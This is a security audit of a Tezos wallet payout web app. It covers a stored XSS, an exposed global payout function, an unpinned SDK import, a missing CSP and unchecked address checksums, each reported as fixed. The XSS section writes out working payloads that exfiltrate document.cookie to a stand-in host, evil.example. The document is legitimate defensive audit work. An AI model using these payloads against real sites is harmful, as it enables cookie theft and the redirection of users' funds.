# Sprinkler — Adversarial Security Audit

Scope: the client-side app as it stands after the single-file → multi-file
split (`index.html`, `css/style.css`, `js/*.js`). The split was a mechanical
refactor — no logic changed — so every finding below already existed in the
original `index.html` monofile. Line numbers point at the new files.

Sprinkler connects a real Tezos wallet and requests a real batched payout, so
the bar here is "can an adversary get the wallet to sign something the user
didn't intend," not just "can they deface the page."

**Status: all five findings below are fixed** as of the `harden-audit-findings`
branch/PR. Each finding keeps its original write-up for context, with a
"**Fixed:**" line added describing the remedy and where to find it. Verified
by re-running the same exploit payloads described below against the patched
code in headless Chromium — see the fix notes for specifics.

## Summary

| # | Severity | Finding | Status |
|---|----------|---------|--------|
| 1 | **Critical** | Stored XSS via unescaped third-party profile data (name + avatar URL), reachable through 4 render paths | ✅ Fixed |
| 2 | High | Wallet payout primitive (`window.tez.sprinkle`) is a global, callable by any script on the page | ✅ Fixed |
| 3 | High | Wallet SDK loaded from a CDN with only a major-version pin, no integrity check | ✅ Fixed |
| 4 | Medium | No Content-Security-Policy — nothing blocks the payload in #1 from executing | ✅ Fixed |
| 5 | Low | Address format is regex-checked but not checksum-validated | ✅ Fixed |

## 1. Critical — Stored XSS via unescaped third-party profile data

**Where:**
- `js/grid.js:42` — every tile in "Your nine"
- `js/search.js:12` — every live search result row (`rowFound`)
- `js/overlay.js:86` — every row of the confirm-dialog payout table

All three build markup the same unsafe way:

```js
// js/grid.js:42
t.innerHTML = `...<img class="av" src="${c.avatar || avatarSVG(c.id)}"
  onerror="this.onerror=null;this.src='${avatarSVG(c.id)}'" alt="">
  <div class="nm">${c.name}</div>...`;
```

`c.name` and `c.avatar` are not app data — they come straight from public,
self-service profile directories that anyone can register an entry in:
objkt's `holder.alias` / `holder.logo` (`js/api.js` `resolveProfile`, and
`objktSearch`), hack.tez's member `name` / `urls.avatar` (`hacktezSearch`),
and Teztree's `displayName` (`teztreeSearch`). None of it is sanitized before
landing in `innerHTML`.

That gives two independent exploit paths, both real:

**a) Text-node injection via `name`.** Register an objkt alias (or hack.tez
name, or Teztree display name) of e.g. `<img src=x onerror=fetch('//evil.example/x?c='+document.cookie)>`.
Anyone who searches for you, or adds your address, renders that string
straight into a `<div class="nm">…</div>` / `<div class="rn">…</div>` /
`<span class="rcpt-name">…</span>` with no escaping — the payload executes in
the victim's page, mid-flow, while they have a wallet connected.

**b) Attribute-breakout injection via `avatar`/`logo`.** These same three
sites also interpolate the untrusted URL into an `<img src="…">` *unquoted
against injection*:

```html
<img class="av" src="${c.avatar || avatarSVG(c.id)}"
     onerror="this.onerror=null;this.src='...'" alt="">
```

Set your objkt `logo` field to `x" onerror="fetch('//evil.example/steal?c='+document.cookie)` —
no `.tez`/address regex applies to this field, so any string is accepted.
The rendered HTML becomes:

```html
<img class="av" src="x" onerror="fetch('//evil.example/steal?c='+document.cookie)" onerror="this.onerror=null;...">
```

`src="x"` is a broken URL, so `onerror` fires immediately and reliably (a
browser uses the *first* `onerror` attribute it parses) — this one doesn't
even need the victim to notice anything odd, it fires the instant the tile
renders.

**Why this is critical, not cosmetic:** the payout recipients (`creators`,
`js/state.js`) are plain JS objects read again, un-refreshed, at the moment
the user clicks "sprinkle" (`js/overlay.js` `doSprinkle`). Injected script has
the entire page's execution context, including that array — it can rewrite
`c.addr` on a recipient after the user has visually reviewed the confirm
table but before signing, retarget the whole batch, or read `window.tez`
credentials/session state. This is a full fund-redirection primitive hiding
behind a profile picture field.

**Fix direction:** never build these rows with `innerHTML` + template
literals over untrusted fields. Either escape (`textContent` for text nodes,
a proper attribute-escaping helper for the `src`/`data-*` attributes), or
build the DOM with `createElement`/`.textContent`/`.src =` assignments
instead of string concatenation. The `.x` remove-button pattern already used
in `js/grid.js` shows the DOM-API style is already in use elsewhere in the
codebase — the tile/row builders are the outliers.

**Fixed:** added `js/escape.js` (`escapeHTML`), a single helper that escapes
`& < > " '` — safe for both a text-node position and a double-quoted
attribute value, which covers every interpolation site in this codebase.
Applied it to every untrusted field at all three sites: `js/grid.js`
(tile `name`/`avatar`), `js/search.js` (`rowFound`'s `name`/`logo`/`meta`/
`address`, plus `rowManual`/`rowDup` for consistency even though those are
regex-constrained), and `js/overlay.js` (confirm-table `name`/`avatar`).
Verified in headless Chromium: fed a tile both exploit strings from this
writeup directly (`c.name = '<img src=x onerror="...">'`,
`c.avatar = 'x" onerror="...'`) and confirmed neither fired — the rendered
`innerHTML` showed `&lt;img ...&gt;` as inert text, not a live element.

## 2. High — wallet payout primitive is a bare global

`js/wallet.js:28` assigns `window.tez = { connect, getActive, sprinkle, … }`.
`sprinkle(recipients)` takes a raw `[{ addr, mutez }]` array and requests a
signature for it — there is no scoping, origin check, or handshake between
the UI code and this object. Anything with page-script access — the XSS in
finding #1, a misbehaving browser extension, or any future third-party
snippet added to the page — can call
`window.tez.sprinkle([{ addr: 'tz1attacker…', mutez: 999000000 }])` directly
and produce a real wallet signing prompt for attacker-chosen terms, with only
the wallet's own confirmation screen standing in the way (and that screen
shows only a raw operation, not the friendly "9 creators" summary the user
has been trained to trust on this page).

**Fix direction:** at minimum, don't rely on this being unreachable —
treating #1 as the priority fix mostly closes this too. If it's worth
hardening independently, keep the SDK wiring but don't hang the payout
function off `window`; have `js/overlay.js` hold the client reference itself
(e.g. via a module-level import rather than a global).

**Fixed:** `js/wallet.js` no longer touches `window` for anything except the
pre-existing `tez-account`/`CustomEvent` bridge (a one-way, no-argument-of-
consequence signal, not an attacker-invokable primitive). `connect`,
`getActive`, `disconnect`, `setNetwork`, and `sprinkle` are now named exports;
`js/overlay.js` imports them directly (`import * as wallet from './wallet.js'`)
and holds no reference on `window`. `window.tez`/`window.tezError`/the
`tez-ready` event are all gone — replaced with an exported `walletReady()`
promise that resolves once (success or failure) instead of an event that a
listener could in principle miss.

## 3. High — unpinned wallet SDK import (supply chain)

`js/wallet.js:7`:

```js
const { DAppClient } = await import('https://esm.sh/@tezos-x/octez.connect-sdk@5?bundle');
```

`@5` pins only the major version. esm.sh resolves that to whatever `5.x.y` is
current at request time, with no lockfile and no subresource-integrity check
(dynamic `import()` doesn't support one). This module *is* the code that
builds the signing request in `sprinkle()` — a compromised release of the
upstream npm package, or a compromised/MITM'd esm.sh response, silently
changes what every visitor's wallet is asked to sign. There's no way for a
user or the app to detect the substitution.

**Fix direction:** pin an exact version (`@5.x.y`), and consider vendoring
the built module into the repo (it's already loaded as a plain ES module,
so self-hosting is a copy-paste, not a build step) so releases are reviewed
before they reach users, consistent with the "no build step" design.

**Fixed:** pinned to the exact published release, `5.0.4`, via a
`SDK_VERSION` constant in `js/wallet.js` (checked against the npm registry
at fix time). Not vendored — the audit's vendoring suggestion is still open,
noted in the code comment as a further hardening step; pinning the exact
version at least makes every deploy reproducible and any future bump an
explicit, reviewable diff instead of a silent drift.

## 4. Medium — no Content-Security-Policy

Nothing in `index.html` sets a CSP (header or `<meta http-equiv>`). Now that
the app is split into external files with no inline `<script>` blocks, a
strict policy — no `'unsafe-inline'`, `script-src` limited to `'self'` and
`https://esm.sh` — is cheap to add and would directly blunt finding #1: an
injected `onerror="…"` handler or `<script>` tag would simply not execute.
This doesn't fix the underlying injection, but it's a real, low-cost second
layer of defense for a page that signs financial transactions.

**Fixed:** added a `<meta http-equiv="Content-Security-Policy">` in
`index.html` with `script-src 'self' https://esm.sh` and no `'unsafe-inline'`
— the directive that actually matters for finding #1. `connect-src`/`img-src`
are left at the `https:`/`wss:` scheme level rather than an exact host list
(see the inline comment in `index.html` for why: Octez Connect's relay
endpoints aren't documented anywhere verifiable from here, and avatar/logo
hosts are deliberately open). `style-src` allows `'unsafe-inline'` because
the app legitimately sets inline `style="…"` attributes from trusted,
locally-computed numbers (split percentages) — not a finding, just a
pre-existing pattern this policy had to accommodate. Verified in headless
Chromium: the browser's own CSP enforcement blocked an injected inline
`onerror` handler outright, as a second, independent layer behind the
escaping fix. Note `frame-ancestors` isn't in the policy — a `<meta>` CSP
can't carry it (confirmed against Chromium; it's silently ignored there), it
only works as a real HTTP header, which plain GitHub Pages hosting can't
send.

## 5. Low — address format checked, not checksummed

`js/state.js:5` — `makeCreator`'s address test,
`/^(tz1|tz2|tz3|KT1)[1-9A-HJ-NP-Za-km-z]{33}$/`, validates prefix and length
only, not the embedded Base58Check checksum. A mistyped or corrupted address
that happens to match the shape is accepted into "your nine," shown resolved
with a generated identicon, and only fails (if it fails) inside the wallet
at signing time — after the user has already reviewed a full nine-recipient
batch and committed to it mentally. Most wallets do reject a bad checksum
before signing, so this isn't exploitable on its own, but it's a UX/defense-
in-depth gap worth closing at the point of entry.

**Fixed:** added `js/base58check.js` (`isValidTezosAddress`), a real
Base58Check decoder + checksum verifier (Base58 decode via `BigInt`, double
SHA-256 via `crypto.subtle`, no dependencies). `js/api.js`'s `enrichCreator`
now runs it on every resolved address — both the direct-entry path and the
name-resolution path — before doing anything else, and rejects with a clear
`invalid address` status if the checksum doesn't match. Verified against a
known-valid address, the same address with one character flipped (fails),
and confirmed in headless Chromium that a corrupted address is now rejected
locally instead of being shown as a resolved recipient.

---

## Checked and ruled out

For completeness, these were considered and are **not** findings:

- **Duplicate-recipient race in `enrichCreator`** (`js/api.js`): looked for a
  timing window where two creators resolving to the same address in
  parallel (e.g. via paste-many) could both slip past the dup check. Traced
  the `await` points — the dup check always runs synchronously right after
  `c.addr` is set and before any further `await`, so there's no interleaving
  that lets two entries with the same resolved address both pass.
- **`javascript:` URL in avatar `src`**: `c.avatar`/`m.logo` are attacker-
  controlled strings and could be a `javascript:` URI, but browsers don't
  execute `javascript:` URLs in `<img src>` (or in the `Image()` object used
  for canvas export in `js/garden.js`), so this isn't a usable vector beyond
  what's already covered by finding #1's attribute-breakout.
- **GraphQL injection via search input** (`js/api.js` `objktSearch`): the
  query text is passed as a bound GraphQL variable, not interpolated into
  the query string; only `%`/`_`/`\` (Hasura `_ilike` wildcards) are
  stripped, which is sufficient since the value never leaves variable
  context.
- **`payoutMutez` rounding** (`js/overlay.js`): verified the floor-then-
  distribute-remainder logic always sums to exactly the input `pot` in
  mutez, with the remainder (always `< creators.length`) distributed one
  unit at a time — no dust, no over/under-allocation.
